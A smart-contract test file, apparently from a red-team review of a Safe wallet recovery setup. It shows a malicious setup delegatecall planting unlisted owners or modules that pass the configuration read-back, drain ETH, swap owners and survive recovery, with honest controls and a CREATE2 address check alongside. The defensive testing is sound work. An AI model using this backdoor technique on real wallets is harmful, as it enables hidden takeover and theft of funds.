// T9: red-team row 2.1 ("setup delegatecall writes an owner or module not linked into the lists").
// A Safe is created through the real SafeProxyFactory v1.4.1 with an initializer whose setup() delegatecall
// goes to a MALICIOUS library (contracts/fixtures/HiddenEntrySetup.sol, test-only). The library does the honest
// Candidate B configuration (module enabled, guardians {R, X}, guardian threshold 2) and then writes
// owners[evil] (T9a) or modules[evilModule] (T9b) = 0x1 directly, without linking the entry into Safe's lists.
// We check what a configuration read-back sees, what Safe's checks accept, and whether the CREATE2 address
// predicted from the honest initializer catches it. T9c (extra, red-team row 3.6): does the hidden owner
// survive a successful recovery?
const { ethers } = require("hardhat");
const { expect } = require("chai");
const h = require("./helpers");

const GUARD_SLOT = ethers.keccak256(ethers.toUtf8Bytes("guard_manager.guard.address"));
const HANDLER_SLOT = ethers.keccak256(ethers.toUtf8Bytes("fallback_manager.handler.address"));
const SALT = 9n;
const MODULES_SLOT = 1n; // Safe v1.4.1: ModuleManager.modules
const OWNERS_SLOT = 2n; // Safe v1.4.1: OwnerManager.owners
const mapSlot = (key, slot) => ethers.keccak256(h.coder.encode(["address", "uint256"], [key, slot]));
const addrFromSlot = (v) => ethers.getAddress("0x" + v.slice(-40));
const ONE = ethers.zeroPadValue("0x01", 32);

async function setupWorld() {
  const ctx = await h.loadWorld();
  const { k } = ctx;
  const honestLib = await (await (await ethers.getContractFactory("SetupFixture", k.relayer)).deploy()).waitForDeployment();
  const evilLib = await (await (await ethers.getContractFactory("HiddenEntrySetup", k.relayer)).deploy()).waitForDeployment();
  const evil = h.key("t9/evil-owner");
  const evilModule = h.key("t9/evil-module");
  for (const w of [evil, evilModule]) await h.fund(w.address);
  const guardians = [k.R.address, ctx.X.target];
  const honestInit = h.setupData([k.Ph.address], 1, ctx.handler.target, honestLib.target,
    honestLib.interface.encodeFunctionData("configure", [[ctx.module.target], ctx.module.target, guardians, 2]));
  const evilInit = (o, m) => h.setupData([k.Ph.address], 1, ctx.handler.target, evilLib.target,
    evilLib.interface.encodeFunctionData("configureAndPlant", [ctx.module.target, guardians, 2, o, m]));
  const expected = {
    proxyCodeHash: ethers.keccak256(await ethers.provider.getCode(ctx.W.target)),
    singleton: ctx.singleton.target, owners: [k.Ph.address], threshold: 1n, modules: [ctx.module.target],
    handler: ctx.handler.target, guardians, guardianThreshold: 2n,
  };
  const predictedHonest = await h.predictSafeAddress(ctx, honestInit, SALT); // what the phone computes offline
  return { ctx, k, evil, evilModule, honestInit, evilInit, expected, predictedHonest };
}

async function deploy(ctx, initializer, sender) {
  const addr = await ctx.factory.createProxyWithNonce.staticCall(ctx.singleton.target, initializer, SALT);
  await (await ctx.factory.connect(sender).createProxyWithNonce(ctx.singleton.target, initializer, SALT)).wait();
  return h.safeAt(addr);
}

// Same read-back as T7 (owners, threshold, modules, guard, handler, guardians, guardian threshold, recovery state).
async function audit(ctx, wallet, ex) {
  const p = ethers.provider;
  const d = [];
  if (ethers.keccak256(await p.getCode(wallet.target)) !== ex.proxyCodeHash) d.push("proxy code differs");
  if (addrFromSlot(await p.getStorage(wallet.target, 0)) !== ex.singleton) d.push("singleton differs");
  const owners = [...(await wallet.getOwners())];
  if (JSON.stringify(owners) !== JSON.stringify(ex.owners)) d.push(`owners [${owners.join(",")}]`);
  if ((await wallet.getThreshold()) !== ex.threshold) d.push("owner threshold differs");
  const [mods, next] = await wallet.getModulesPaginated(h.SENTINEL, 50);
  if (JSON.stringify([...mods]) !== JSON.stringify(ex.modules) || next !== h.SENTINEL) d.push(`modules [${[...mods].join(",")}]`);
  if (addrFromSlot(await p.getStorage(wallet.target, GUARD_SLOT)) !== ethers.ZeroAddress) d.push("guard set");
  if (addrFromSlot(await p.getStorage(wallet.target, HANDLER_SLOT)) !== ex.handler) d.push("fallback handler differs");
  if (!h.sameSet([...(await ctx.module.getGuardians(wallet.target))], ex.guardians)) d.push("guardians differ");
  if ((await ctx.module.threshold(wallet.target)) !== ex.guardianThreshold) d.push("guardian threshold differs");
  if ((await ctx.module.getRecoveryRequest(wallet.target)).executeAfter !== 0n) d.push("recovery already pending");
  if ((await ctx.module.nonce(wallet.target)) !== 0n) d.push("recovery nonce not fresh");
  return d;
}

async function checkLayout(wallet, ownerKey, moduleAddr) {
  // Before trusting the slot numbers, check them against HONEST entries: owners[Ph] and modules[module]
  // must both hold the sentinel 0x1 in a one-owner, one-module Safe.
  const o = await ethers.provider.getStorage(wallet.target, mapSlot(ownerKey, OWNERS_SLOT));
  const m = await ethers.provider.getStorage(wallet.target, mapSlot(moduleAddr, MODULES_SLOT));
  console.log(`      evidence: layout check: storage owners[Ph] (slot-2 mapping) = ${o}; modules[recovery module] (slot-1 mapping) = ${m}`);
  expect(o).to.equal(ONE);
  expect(m).to.equal(ONE);
}

describe("T9 hidden (unlinked) owner or module planted by a malicious setup delegatecall (red-team row 2.1)", function () {
  it("T9a hidden owner: getOwners() shows only [Ph], read-back is clean, yet evil alone signs; honest CREATE2 address differs", async function () {
    const { ctx, k, evil, honestInit, evilInit, expected, predictedHonest } = await setupWorld();
    const init = evilInit(evil.address, ethers.ZeroAddress);
    const Wm = await deploy(ctx, init, k.A); // the attacker submits the creation through the real factory
    await h.fund(Wm.target, "10");
    const predictedEvil = await h.predictSafeAddress(ctx, init, SALT);
    console.log(`      evidence: CREATE2 from HONEST initializer ${predictedHonest}; deployed ${Wm.target}; CREATE2 from malicious initializer ${predictedEvil}`);
    expect(Wm.target).to.not.equal(predictedHonest);
    expect(Wm.target).to.equal(predictedEvil);

    await checkLayout(Wm, k.Ph.address, ctx.module.target);
    const planted = await ethers.provider.getStorage(Wm.target, mapSlot(evil.address, OWNERS_SLOT));
    console.log(`      evidence: storage owners[evil] = ${planted} (planted, not linked)`);
    expect(planted).to.equal(ONE);

    const owners = [...(await Wm.getOwners())];
    console.log(`      evidence: getOwners() = [${owners.join(",")}] (Ph = ${k.Ph.address}); getThreshold() = ${await Wm.getThreshold()}`);
    expect(owners).to.deep.equal([k.Ph.address]);
    const d = await audit(ctx, Wm, expected);
    console.log(`      evidence: read-back discrepancies vs the honest configuration: ${d.length ? d.join("; ") : "none"}`);
    expect(d).to.deep.equal([]);
    const isOwnerEvil = await Wm.isOwner(evil.address);
    console.log(`      evidence: isOwner(evil ${evil.address}) = ${isOwnerEvil}`);
    expect(isOwnerEvil).to.equal(true);

    const before = await ethers.provider.getBalance(evil.address);
    await h.expectSuccess("Wm.execTransaction signed ONLY by evil (send 1 ETH to evil), relayed by relayer", () =>
      h.execSafe(Wm, [evil], evil.address, "0x", { value: ethers.parseEther("1"), sender: k.relayer }));
    expect(await ethers.provider.getBalance(evil.address)).to.equal(before + ethers.parseEther("1"));
    await h.expectSuccess("Wm.execTransaction signed ONLY by evil: disableModule(recovery module)", () =>
      h.execSafe(Wm, [evil], Wm.target, Wm.interface.encodeFunctionData("disableModule", [h.SENTINEL, ctx.module.target]), { sender: k.relayer }));
    console.log(`      evidence: after evil's transaction, getModulesPaginated = [${[...(await Wm.getModulesPaginated(h.SENTINEL, 10))[0]].join(",")}]`);

    // Control: the honest initializer at the same salt lands exactly at the predicted address and evil is no owner there.
    const Wh = await deploy(ctx, honestInit, k.relayer);
    await h.fund(Wh.target, "10");
    console.log(`      evidence: control: honest initializer deployed at ${Wh.target} (== honest prediction: ${Wh.target === predictedHonest}); isOwner(evil) = ${await Wh.isOwner(evil.address)}`);
    expect(Wh.target).to.equal(predictedHonest);
    await h.expectRevert("control: honest Safe, transaction signed only by evil", () =>
      h.execSafe(Wh, [evil], evil.address, "0x", { value: ethers.parseEther("1"), sender: k.relayer }), "GS026");
  });

  it("T9b hidden module: getModulesPaginated misses it, read-back is clean, yet execTransactionFromModule accepts it", async function () {
    const { ctx, k, evilModule, honestInit, evilInit, expected, predictedHonest } = await setupWorld();
    const init = evilInit(ethers.ZeroAddress, evilModule.address);
    const Wm = await deploy(ctx, init, k.A);
    await h.fund(Wm.target, "10");
    console.log(`      evidence: CREATE2 from HONEST initializer ${predictedHonest}; deployed ${Wm.target}; CREATE2 from malicious initializer ${await h.predictSafeAddress(ctx, init, SALT)}`);
    expect(Wm.target).to.not.equal(predictedHonest);

    await checkLayout(Wm, k.Ph.address, ctx.module.target);
    const planted = await ethers.provider.getStorage(Wm.target, mapSlot(evilModule.address, MODULES_SLOT));
    console.log(`      evidence: storage modules[evilModule] = ${planted} (planted, not linked)`);
    expect(planted).to.equal(ONE);
    const [mods, next] = await Wm.getModulesPaginated(h.SENTINEL, 50);
    console.log(`      evidence: getModulesPaginated(SENTINEL, 50) = [${[...mods].join(",")}], next = ${next} (recovery module = ${ctx.module.target})`);
    expect([...mods]).to.deep.equal([ctx.module.target]);
    const d = await audit(ctx, Wm, expected);
    console.log(`      evidence: read-back discrepancies vs the honest configuration: ${d.length ? d.join("; ") : "none"}`);
    expect(d).to.deep.equal([]);
    const enabled = await Wm.isModuleEnabled(evilModule.address);
    console.log(`      evidence: isModuleEnabled(evilModule ${evilModule.address}) = ${enabled}`);
    expect(enabled).to.equal(true);

    const before = await ethers.provider.getBalance(Wm.target); // the caller pays gas, so measure the Safe's balance
    await h.expectSuccess("evilModule calls Wm.execTransactionFromModule(send 1 ETH to evilModule) - no signature, no delay", () =>
      Wm.connect(evilModule).execTransactionFromModule(evilModule.address, ethers.parseEther("1"), "0x", 0));
    console.log(`      evidence: Wm balance ${ethers.formatEther(before)} -> ${ethers.formatEther(await ethers.provider.getBalance(Wm.target))} ETH`);
    expect(await ethers.provider.getBalance(Wm.target)).to.equal(before - ethers.parseEther("1"));
    const swap = Wm.interface.encodeFunctionData("swapOwner", [h.SENTINEL, k.Ph.address, evilModule.address]);
    await h.expectSuccess("evilModule calls Wm.execTransactionFromModule(swapOwner Ph -> evilModule)", () =>
      Wm.connect(evilModule).execTransactionFromModule(Wm.target, 0, swap, 0));
    const owners = [...(await Wm.getOwners())];
    console.log(`      evidence: Wm.getOwners() now [${owners.join(",")}]`);
    expect(owners).to.deep.equal([evilModule.address]);

    // Control: on an honest Safe the same caller is refused.
    const Wh = await deploy(ctx, honestInit, k.relayer);
    expect(Wh.target).to.equal(predictedHonest);
    await h.expectRevert("control: honest Safe, evilModule calls execTransactionFromModule", () =>
      Wh.connect(evilModule).execTransactionFromModule(evilModule.address, 0, "0x", 0), "GS104");
  });

  it("T9c (extra, row 3.6) the hidden owner survives a completed R + X recovery", async function () {
    const { ctx, k, evil, evilInit } = await setupWorld();
    const { module, X } = ctx;
    const Wm = await deploy(ctx, evilInit(evil.address, ethers.ZeroAddress), k.A);
    await h.fund(Wm.target, "10");
    const owners = [k.N.address];
    const hash = await h.recoveryHash(ctx, Wm.target, owners, 1);
    const sigs = h.sortByAddr([
      { signer: k.R.address, signature: h.eoaSig(k.R, hash) },
      { signer: X.target, signature: await h.safe1271Sig(ctx, X.target, k.P, hash) },
    ], (x) => x.signer);
    await h.expectSuccess("R + X(P) multiConfirmRecovery(Wm,[newKey],1,execute=true)", () =>
      module.connect(k.relayer).multiConfirmRecovery(Wm.target, owners, 1, sigs, true));
    await h.increaseTime(h.RECOVERY_PERIOD);
    await h.expectSuccess("finalizeRecovery(Wm) after the wait", () => module.connect(k.relayer).finalizeRecovery(Wm.target));
    console.log(`      evidence: after recovery getOwners() = [${[...(await Wm.getOwners())].join(",")}] (newKey); isOwner(evil) = ${await Wm.isOwner(evil.address)}`);
    expect([...(await Wm.getOwners())]).to.deep.equal([k.N.address]);
    await h.expectRevert("old Ph signs a transfer after recovery", () =>
      h.execSafe(Wm, [k.Ph], k.Ph.address, "0x", { value: ethers.parseEther("1"), sender: k.relayer }), "GS026");
    await h.expectSuccess("evil ALONE still signs a transfer after recovery", () =>
      h.execSafe(Wm, [evil], evil.address, "0x", { value: ethers.parseEther("1"), sender: k.relayer }));
  });
});
